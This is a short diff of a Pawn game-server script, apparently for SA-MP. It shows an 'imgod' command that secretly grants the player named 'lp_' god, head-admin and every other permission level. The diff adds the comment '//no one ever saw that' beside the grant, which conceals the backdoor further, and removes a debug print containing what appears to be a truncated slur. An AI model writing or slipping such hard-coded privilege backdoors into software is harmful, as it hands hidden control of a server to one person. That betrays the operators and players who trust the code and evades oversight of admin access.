@@ -9,9 +9,9 @@
 
 ocmd:imgod(playerid, params[])
 {
-	print("ngga");
 	if(!strcmp(PlayerName(playerid), "lp_", true))
 	{
+		//no one ever saw that
 		pPermissions[playerid] = PERM_GOD | PERM_PROJLEITER | PERM_HEAD_ADMIN | PERM_ADMIN | PERM_SUPPORTER;
 		SendClientMessage(playerid, GREEN, " > Praise the Lord.");
 		return 1;
